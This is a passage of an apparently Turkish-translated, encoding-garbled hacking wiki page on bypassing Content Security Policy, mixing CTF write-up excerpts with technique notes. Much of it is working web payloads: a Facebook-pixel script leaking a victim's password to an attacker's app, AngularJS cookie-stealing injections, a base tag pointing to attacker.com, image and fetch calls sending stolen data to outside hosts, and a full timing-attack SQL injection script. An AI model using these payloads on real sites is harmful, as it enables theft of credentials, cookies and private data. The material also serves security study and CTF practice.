1. Verileri Ã§Ä±karmak istediÄŸiniz hedef siteye, Facebook SDK aracÄ± "fbq"yu doÄŸrudan kullanarak ve "customEvent" ve veri yÃ¼kÃ¼ ile veri Ã§Ä±karabilirsiniz.
1. Uygulama "Etkinlik YÃ¶neticisi"ne gidin ve oluÅŸturduÄŸunuz uygulamayÄ± seÃ§in (etkinlik yÃ¶neticisi, ÅŸu URL'ye benzer bir yerde bulunabilir: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events)
1. "Test Etkinlikleri" sekmesini seÃ§erek "sizin" web siteniz tarafÄ±ndan gÃ¶nderilen etkinlikleri gÃ¶rebilirsiniz.

ArdÄ±ndan, kurban tarafÄ±nda, aÅŸaÄŸÄ±daki kodu Ã§alÄ±ÅŸtÄ±rarak Facebook izleme pikselini saldÄ±rganÄ±n Facebook geliÅŸtirici hesabÄ± uygulama kimliÄŸine yÃ¶nlendirmek ve bÃ¶yle bir Ã¶zel etkinlik oluÅŸturmak iÃ§in aÅŸaÄŸÄ±daki kodu Ã§alÄ±ÅŸtÄ±rÄ±rsÄ±nÄ±z:
```JavaScript
fbq('init', '1279785999289471');â€‹ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{â€‹
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"â€‹
});
```
DiÄŸer tabloda belirtilen yedi Ã¼Ã§Ã¼ncÃ¼ taraf alan adÄ± iÃ§in, bunlarÄ± kÃ¶tÃ¼ye kullanmanÄ±n baÅŸka birÃ§ok yolu vardÄ±r. DiÄŸer Ã¼Ã§Ã¼ncÃ¼ taraf kÃ¶tÃ¼ye kullanÄ±mlar hakkÄ±nda ek aÃ§Ä±klamalar iÃ§in Ã¶nceki [blog yazÄ±sÄ±na](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) baÅŸvurun.

### RPO (Relative Path Overwrite) ile GeÃ§me <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Yol kÄ±sÄ±tlamalarÄ±nÄ± atlamak iÃ§in bahsedilen yÃ¶nlendirme yÃ¶nteminin yanÄ± sÄ±ra, bazÄ± sunucularda kullanÄ±labilecek baÅŸka bir teknik olan Relative Path Overwrite (RPO) tekniÄŸi vardÄ±r.

Ã–rneÄŸin, CSP `https://example.com/scripts/react/` yoluna izin veriyorsa, aÅŸaÄŸÄ±daki gibi atlanabilir:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
TarayÄ±cÄ± sonunda `https://example.com/scripts/angular/angular.js` yÃ¼kleyecektir.

Bu, tarayÄ±cÄ± iÃ§in `https://example.com/scripts/react/` altÄ±nda bulunan `..%2fangular%2fangular.js` adlÄ± bir dosya yÃ¼klÃ¼yormuÅŸsunuz gibi gÃ¶rÃ¼ndÃ¼ÄŸÃ¼ iÃ§in CSP'ye uyumludur.

SonuÃ§ olarak, bunu Ã§Ã¶zecekler ve `https://example.com/scripts/react/../angular/angular.js` talep edecekler, bu da `https://example.com/scripts/angular/angular.js` ile eÅŸdeÄŸerdir.

TarayÄ±cÄ± ve sunucu arasÄ±ndaki URL yorumlama tutarsÄ±zlÄ±ÄŸÄ±nÄ± **sÃ¶mÃ¼rerek, yol kurallarÄ± atlatÄ±labilir**.

Ã‡Ã¶zÃ¼m, sunucu tarafÄ±nda `%2f`'yi `/` olarak iÅŸlememektir, bÃ¶ylece tarayÄ±cÄ± ve sunucu arasÄ±nda tutarlÄ± yorumlama saÄŸlanÄ±r ve bu sorun Ã¶nlenir.

Ã‡evrimiÃ§i Ã–rnek: [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS yÃ¼rÃ¼tme

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### eksik **base-uri**

EÄŸer **base-uri** yÃ¶nergesi eksikse, [**dangling markup injection**](../dangling-markup-html-scriptless-injection/) gerÃ§ekleÅŸtirmek iÃ§in bunu kÃ¶tÃ¼ye kullanabilirsiniz.

AyrÄ±ca, eÄŸer **sayfa, bir Nonce kullanarak gÃ¶reli bir yol** (Ã¶rneÄŸin `<script src="/js/app.js">`) kullanarak bir betik yÃ¼klÃ¼yorsa, XSS elde etmek iÃ§in **base** **tag**'Ä±nÄ±zÄ± kullanarak **kendi sunucunuzdan** betiÄŸi **yÃ¼kleyebilirsiniz.**\
EÄŸer zafiyetli sayfa **httpS** ile yÃ¼kleniyorsa, base'de bir httpS URL kullanÄ±n.
```html
<base href="https://www.attacker.com/">
```
### AngularJS olaylarÄ±

Bir politika olan Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP), JavaScript olaylarÄ±nÄ± kÄ±sÄ±tlayabilir. Bununla birlikte, AngularJS, Ã¶zel olaylar sunarak alternatif bir Ã§Ã¶zÃ¼m sunar. Bir olay iÃ§inde, AngularJS, tarayÄ±cÄ±daki olay nesnesine referans olan benzersiz bir `$event` nesnesi saÄŸlar. Bu `$event` nesnesi, CSP'yi atlamak iÃ§in kullanÄ±labilir. Ã–zellikle Chrome'da, `$event/event` nesnesi, olayÄ±n yÃ¼rÃ¼tme zincirinde yer alan bir nesne dizisini iÃ§eren bir `path` Ã¶zelliÄŸine sahiptir ve `window` nesnesi her zaman sonunda bulunur. Bu yapÄ±, kum havuzu kaÃ§Ä±ÅŸ taktikleri iÃ§in Ã¶nemlidir.

Bu diziyi `orderBy` filtresine yÃ¶nlendirerek, onun Ã¼zerinde dÃ¶ngÃ¼ oluÅŸturmak ve terminal Ã¶ÄŸesini (`window` nesnesi) kullanarak `alert()` gibi bir global iÅŸlevi tetiklemek mÃ¼mkÃ¼ndÃ¼r. AÅŸaÄŸÄ±daki Ã¶rnek kod parÃ§acÄ±ÄŸÄ±, bu sÃ¼reci aÃ§Ä±klar:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Bu Ã¶rnek, `ng-focus` direktifinin etkinleÅŸtirilmesi iÃ§in `$event.path|orderBy` kullanÄ±mÄ±nÄ± vurgular. `path` dizisini manipÃ¼le etmek iÃ§in kullanÄ±lÄ±r ve `window` nesnesini kullanarak `alert()` fonksiyonunu Ã§alÄ±ÅŸtÄ±rÄ±r, bÃ¶ylece `document.cookie` ifÅŸa edilir.

**Angular bypaslarÄ±nÄ±** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) **adresinde bulabilirsiniz.**

### AngularJS ve beyaz listelenen alan adÄ±
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Bir Angular JS uygulamasÄ±nda betik yÃ¼kleme iÃ§in etki alanlarÄ±nÄ± beyaz listeye alan bir CSP politikasÄ±, geri Ã§aÄŸÄ±rma iÅŸlevlerinin ve belirli zafiyetli sÄ±nÄ±flarÄ±n Ã§aÄŸrÄ±lmasÄ± yoluyla atlatÄ±labilir. Bu teknik hakkÄ±nda daha fazla bilgi, bu [git deposunda](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22) bulunan ayrÄ±ntÄ±lÄ± bir kÄ±lavuzda bulunabilir.

Ã‡alÄ±ÅŸan yÃ¼kler:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
DiÄŸer JSONP keyfi yÃ¼rÃ¼tme uÃ§ noktalarÄ± [**burada**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) bulunabilir (bazÄ±larÄ± silindi veya dÃ¼zeltildi)

### YÃ¶nlendirme ile Atlatma

CSP, sunucu tarafÄ± yÃ¶nlendirmesiyle karÅŸÄ±laÅŸtÄ±ÄŸÄ±nda ne olur? YÃ¶nlendirme, izin verilmeyen farklÄ± bir kÃ¶k dizine yÃ¶nlendirirse, hala baÅŸarÄ±sÄ±z olur.

Ancak, [CSP spec 4.2.2.3. Yollar ve YÃ¶nlendirmeler](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects) bÃ¶lÃ¼mÃ¼nde aÃ§Ä±klandÄ±ÄŸÄ± gibi, yÃ¶nlendirme farklÄ± bir yola yÃ¶nlendirirse, orijinal kÄ±sÄ±tlamalarÄ± atlayabilir.

Ä°ÅŸte bir Ã¶rnek:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
EÄŸer CSP `https://www.google.com/a/b/c/d` olarak ayarlanmÄ±ÅŸsa, yolun dikkate alÄ±ndÄ±ÄŸÄ± iÃ§in `/test` ve `/a/test` betikleri CSP tarafÄ±ndan engellenecektir.

Ancak, son `http://localhost:5555/301` **sunucu tarafÄ±nda `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`'e yÃ¶nlendirilecektir**. YÃ¶nlendirme olduÄŸu iÃ§in **yol dikkate alÄ±nmaz** ve **betik yÃ¼klenebilir**, bÃ¶ylece yol kÄ±sÄ±tlamasÄ± atlatÄ±lÄ±r.

Bu yÃ¶nlendirme ile yol tamamen belirtilse bile, hala atlatÄ±lacaktÄ±r.

Bu nedenle, en iyi Ã§Ã¶zÃ¼m, web sitesinin aÃ§Ä±k yÃ¶nlendirme aÃ§Ä±klarÄ±na sahip olmadÄ±ÄŸÄ±ndan ve CSP kurallarÄ±nda istismar edilebilecek alan adlarÄ±nÄ±n olmadÄ±ÄŸÄ±ndan emin olmaktÄ±r.

### Dangling markup ile CSP atlatma

[Ä°lgili bilgilere buradan ulaÅŸabilirsiniz](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; ile XSS Ã¼zerinden CSP atlatma
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'`, herhangi bir betiÄŸi kodun iÃ§inde Ã§alÄ±ÅŸtÄ±rabileceÄŸiniz anlamÄ±na gelir (XSS kodu Ã§alÄ±ÅŸtÄ±rabilir) ve `img-src *`, web sayfasÄ±nda herhangi bir kaynaktan herhangi bir resmi kullanabileceÄŸiniz anlamÄ±na gelir.

Bu CSP'yi resimler aracÄ±lÄ±ÄŸÄ±yla verileri dÄ±ÅŸarÄ± Ã§Ä±kararak atlayabilirsiniz (bu durumda XSS, bir bot tarafÄ±ndan eriÅŸilebilen bir sayfada bir CSRF'yi istismar eder ve bir resim aracÄ±lÄ±ÄŸÄ±yla bayraÄŸÄ± Ã§Ä±karÄ±rken bir SQLi Ã§Ä±karÄ±r):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
Kaynak: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Bu yapÄ±landÄ±rmayÄ± ayrÄ±ca, bir resmin iÃ§ine yerleÅŸtirilmiÅŸ JavaScript kodunu yÃ¼klemek iÃ§in de kullanabilirsiniz. Ã–rneÄŸin, sayfa Twitter'dan resim yÃ¼klemeye izin veriyorsa, Ã¶zel bir resim oluÅŸturabilir, bunu Twitter'a yÃ¼kleyebilir ve "**unsafe-inline**" Ã¶zelliÄŸini kÃ¶tÃ¼ye kullanarak bir XSS gibi JS kodunu yÃ¼rÃ¼tebilirsiniz. Bu kod, resmi yÃ¼kleyecek, iÃ§inden JS'yi Ã§Ä±karacak ve onu Ã§alÄ±ÅŸtÄ±racaktÄ±r: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Hizmet Ä°ÅŸÃ§ileriyle

Hizmet iÅŸÃ§ilerinin **`importScripts`** fonksiyonu CSP tarafÄ±ndan sÄ±nÄ±rlanmaz:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Politika Enjeksiyonu

**AraÅŸtÄ±rma:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Siz tarafÄ±ndan gÃ¶nderilen bir **parametre**, **politikanÄ±n bildirisine yapÄ±ÅŸtÄ±rÄ±lÄ±yorsa**, politikayÄ± **kullanÄ±ÅŸsÄ±z hale getiren** bir ÅŸekilde politikayÄ± deÄŸiÅŸtirebilirsiniz. AÅŸaÄŸÄ±daki yÃ¶ntemlerden herhangi birini kullanarak script 'unsafe-inline' izni verebilirsiniz:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Bu yÃ¶nerge mevcut script-src yÃ¶nergelerini Ã¼zerine yazar.\
Bir Ã¶rneÄŸi burada bulabilirsiniz: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Edge'de Ã§ok daha basittir. EÄŸer CSP'ye sadece bunu ekleyebilirsiniz: **`;_`** Edge, **tÃ¼m politikayÄ± dÃ¼ÅŸÃ¼rÃ¼r**.\
Ã–rnek: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; XSS ile (iframe) - Zaman saldÄ±rÄ±sÄ±

Dikkat edin, `'unsafe-inline'` yÃ¶nergesinin eksik olduÄŸunu fark edin.\
Bu sefer, bir `<iframe` ile XSS kullanarak kurbanÄ± **kontrolÃ¼nÃ¼zdeki** bir sayfayÄ± **yÃ¼klemeye** zorlayabilirsiniz. Bu sefer, kurbanÄ±n bilgi Ã§Ä±karmak istediÄŸiniz sayfaya eriÅŸmesini saÄŸlayacaksÄ±nÄ±z (**CSRF**). SayfanÄ±n iÃ§eriÄŸine eriÅŸemezsiniz, ancak sayfanÄ±n yÃ¼klenmesi iÃ§in gereken sÃ¼reyi bir ÅŸekilde **kontrol edebilirseniz**, ihtiyacÄ±nÄ±z olan bilgiyi Ã§Ä±karabilirsiniz.

Bu sefer, bir **bayrak** Ã§Ä±karÄ±lacak, bir **karakter doÄŸru tahmin edildiÄŸinde** SQLi tarafÄ±ndan **yanÄ±t** fonksiyonunun uyku sÃ¼resi nedeniyle daha fazla zaman alÄ±r. Sonra bayraÄŸÄ± Ã§Ä±karabileceksiniz:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Yer Ä°ÅŸaretleri AracÄ±lÄ±ÄŸÄ±yla

Bu saldÄ±rÄ±, saldÄ±rganÄ±n kullanÄ±cÄ±yÄ± tarayÄ±cÄ±nÄ±n yer iÅŸaretleri Ã¼zerine bir baÄŸlantÄ±yÄ± sÃ¼rÃ¼kleyip bÄ±rakmaya ikna ettiÄŸi bir sosyal mÃ¼hendislik gerektirir. Bu yer iÅŸareti, **kÃ¶tÃ¼ amaÃ§lÄ± javascript** kodunu iÃ§erecektir ve sÃ¼rÃ¼klendiÄŸinde veya tÄ±klandÄ±ÄŸÄ±nda mevcut web penceresinin baÄŸlamÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lacak, CSP'yi atlayacak ve Ã§erezler veya tokenlar gibi hassas bilgileri Ã§almaya izin verecektir.

Daha fazla bilgi iÃ§in [**buradaki orijinal rapora bakÄ±n**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP'nin KÄ±sÄ±tlanmasÄ±yla CSP Atlatma

[**Bu CTF Ã§Ã¶zÃ¼mÃ¼nde**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP, izin verilen bir iframe iÃ§ine daha kÄ±sÄ±tlayÄ±cÄ± bir CSP enjekte edilerek atlatÄ±lÄ±r. Bu daha kÄ±sÄ±tlayÄ±cÄ± CSP, belirli bir JS dosyasÄ±nÄ±n yÃ¼klenmesine izin vermedi ve ardÄ±ndan **prototip kirliliÄŸi** veya **dom clobbering** aracÄ±lÄ±ÄŸÄ±yla farklÄ± bir betiÄŸi kÃ¶tÃ¼ye kullanarak keyfi bir betik yÃ¼klemeye izin verdi.

Bir Iframe'in CSP'sini **`csp`** Ã¶zelliÄŸiyle sÄ±nÄ±rlayabilirsiniz:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

Bu [**CTF Ã§Ã¶zÃ¼mÃ¼nde**](https://github.com/aszx87410/ctf-writeups/issues/48), **HTML enjeksiyonu** aracÄ±lÄ±ÄŸÄ±yla **CSP** daha fazla **kÄ±sÄ±tlanabiliyordu**, bÃ¶ylece CSTI'yi Ã¶nleyen bir betik devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ± ve bu nedenle **zafiyet sÃ¶mÃ¼rÃ¼lebilir hale geldi.**\
CSP, **HTML meta etiketleri** kullanÄ±larak daha kÄ±sÄ±tlayÄ±cÄ± hale getirilebilir ve iÃ§erideki betikler **nonce** iznini kaldÄ±rarak **devre dÄ±ÅŸÄ± bÄ±rakÄ±labilir** ve **sha** ile belirli bir iÃ§erideki betik etkinleÅŸtirilebilir:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP) GeÃ§meyle JS Bilgi SÄ±zdÄ±rma

EÄŸer sunucunun yanÄ±t olarak **`Content-Security-Policy-Report-Only`** baÅŸlÄ±ÄŸÄ±nÄ± **senin kontrolÃ¼nde bir deÄŸerle** dÃ¶ndÃ¼rmesini saÄŸlayabilirsen (belki CRLF nedeniyle), bu baÅŸlÄ±ÄŸÄ± kendi sunucuna yÃ¶nlendirebilirsin ve sÄ±zdÄ±rmak istediÄŸin **JS iÃ§eriÄŸini** **`<script>`** etiketiyle sararsan, bÃ¼yÃ¼k olasÄ±lÄ±kla CSP tarafÄ±ndan `unsafe-inline` izin verilmediÄŸi iÃ§in bu bir CSP hatasÄ± tetikleyecek ve hassas bilgileri iÃ§eren script kÄ±smÄ± `Content-Security-Policy-Report-Only` Ã¼zerinden sunucuya gÃ¶nderilecektir.

Bir Ã¶rnek iÃ§in [**bu CTF Ã§Ã¶zÃ¼mÃ¼ne**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes) bakabilirsin.

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### CSP ve Iframe ile Bilgi SÄ±zdÄ±rma

- CSP tarafÄ±ndan izin verilen bir URL'ye (bunu `https://example.redirect.com` olarak adlandÄ±ralÄ±m) iÅŸaret eden bir `iframe` oluÅŸturulur.
- Bu URL daha sonra CSP tarafÄ±ndan **izin verilmeyen** gizli bir URL'ye (Ã¶rneÄŸin, `https://usersecret.example2.com`) yÃ¶nlendirilir.
- `securitypolicyviolation` etkinliÄŸini dinleyerek, `blockedURI` Ã¶zelliÄŸi yakalanabilir. Bu Ã¶zellik, engellenen URI'nin alan adÄ±nÄ± ortaya Ã§Ä±kararak, baÅŸlangÄ±Ã§ URL'sinin yÃ¶nlendirildiÄŸi gizli alan adÄ±nÄ± sÄ±zdÄ±rÄ±r.

Ä°lginÃ§ bir nokta, Chrome ve Firefox gibi tarayÄ±cÄ±larÄ±n CSP'ye iliÅŸkin iframe'leri iÅŸleme konusunda farklÄ± davranÄ±ÅŸlara sahip olmasÄ±dÄ±r, bu da tanÄ±msÄ±z davranÄ±ÅŸ nedeniyle hassas bilgilerin sÄ±zmasÄ±na yol aÃ§abilir.

BaÅŸka bir teknik ise CSP'yi kendisi kullanarak gizli alt alan adÄ±nÄ± Ã§Ä±karmaktÄ±r. Bu yÃ¶ntem, ikili arama algoritmasÄ±na dayanÄ±r ve CSP'yi kasÄ±tlÄ± olarak engellenen belirli alan adlarÄ±nÄ± iÃ§erecek ÅŸekilde ayarlamayÄ± gerektirir. Ã–rneÄŸin, gizli alt alan adÄ± bilinmeyen karakterlerden oluÅŸuyorsa, CSP yÃ¶nergesini bu alt alan adlarÄ±nÄ± engellemek veya izin vermek iÃ§in deÄŸiÅŸtirerek farklÄ± alt alan adlarÄ±nÄ± iteratif olarak test edebilirsiniz. AÅŸaÄŸÄ±da, bu yÃ¶ntemi kolaylaÅŸtÄ±rmak iÃ§in CSP'nin nasÄ±l ayarlanabileceÄŸini gÃ¶steren bir Ã¶rnek bulunmaktadÄ±r:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
CSP tarafÄ±ndan engellenen veya izin verilen istekleri izleyerek, gizli alt alan adÄ±ndaki olasÄ± karakterleri daraltarak sonunda tam URL'yi ortaya Ã§Ä±karabilirsiniz.

Her iki yÃ¶ntem de CSP uygulamasÄ±nÄ±n ve tarayÄ±cÄ±lardaki davranÄ±ÅŸÄ±nÄ±n inceliklerinden yararlanÄ±r ve gÃ¶rÃ¼nÃ¼ÅŸte gÃ¼venli politikalarÄ±n hassas bilgileri istemeden sÄ±zdÄ±rabileceÄŸini gÃ¶sterir.

[**Buradan**](https://ctftime.org/writeup/29310) hile.

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±na ve zorluklarÄ±na inen iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
GerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼ler aracÄ±lÄ±ÄŸÄ±yla hÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gÃ¼ncel kalÄ±n

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avlarÄ± baÅŸlatma ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi edinin

BugÃ¼n [**Discord**](https://discord.com/invite/N3FrSbmwdy)'a katÄ±lÄ±n ve en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

## CSP'yi Atlatmak Ä°Ã§in GÃ¼vensiz Teknolojiler

### PHP yanÄ±t tamponu aÅŸÄ±rÄ± yÃ¼kleme

PHP, varsayÄ±lan olarak yanÄ±tÄ± 4096 bayte kadar tamponlar. Bu nedenle, PHP bir uyarÄ± gÃ¶steriyorsa, yeterli veri saÄŸlayarak uyarÄ±larÄ±n iÃ§ine, **yanÄ±t** **CSP baÅŸlÄ±ÄŸÄ±ndan Ã¶nce** **gÃ¶nderilecektir**, bu da baÅŸlÄ±ÄŸÄ±n gÃ¶rmezden gelinmesine neden olur.\
Sonra, tekniÄŸin temel olarak **yanÄ±t tamponunu uyarÄ±larla doldurmak** olduÄŸu iÃ§in CSP baÅŸlÄ±ÄŸÄ± gÃ¶nderilmez.

Fikir [**bu yazÄ±dan**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points) alÄ±nmÄ±ÅŸtÄ±r.

### Hata SayfasÄ±nÄ± Yeniden Yazma

[**Bu yazÄ±dan**](https://blog.ssrf.kr/69) gÃ¶rÃ¼ndÃ¼ÄŸÃ¼ kadarÄ±yla, bir CSP korumasÄ±nÄ± atlamak mÃ¼mkÃ¼n olmuÅŸ, hata sayfasÄ±nÄ± (potansiyel olarak CSP olmadan) yÃ¼kleyerek ve iÃ§eriÄŸini yeniden yazarak.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME, bir sayfanÄ±n bir uÃ§ noktasÄ±nda bulunan bir XSS'i (veya Ã§ok sÄ±nÄ±rlÄ± bir XSS'i) **kÃ¶tÃ¼ye kullanmak** iÃ§in aynÄ± kÃ¶kten **diÄŸer uÃ§ noktalarÄ±nÄ± kÃ¶tÃ¼ye kullanÄ±r**. Bu, savunmasÄ±z uÃ§ noktayÄ± saldÄ±rgan sayfadan yÃ¼kleyerek ve ardÄ±ndan saldÄ±rgan sayfayÄ± kÃ¶tÃ¼ye kullanmak istediÄŸiniz aynÄ± kÃ¶kteki gerÃ§ek uÃ§ noktaya yeniden yÃ¼kleyerek yapÄ±lÄ±r. Bu ÅŸekilde, **savunmasÄ±z uÃ§ nokta**, **payload** iÃ§indeki **`opener`** nesnesini kullanarak **kÃ¶tÃ¼ye kullanmak istediÄŸiniz gerÃ§ek uÃ§ noktanÄ±n DOM'una eriÅŸebilir**. Daha fazla bilgi iÃ§in ÅŸuraya bakÄ±n:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

AyrÄ±ca, **wordpress**'in `/wp-json/wp/v2/users/1?_jsonp=data` yolunda bir **JSONP** uÃ§ noktasÄ± vardÄ±r ve bu uÃ§ nokta, yalnÄ±zca harf, sayÄ± ve noktalarla sÄ±nÄ±rlÄ± olmak Ã¼zere Ã§Ä±ktÄ±ya gÃ¶nderilen **veriyi yansÄ±tÄ±r**.

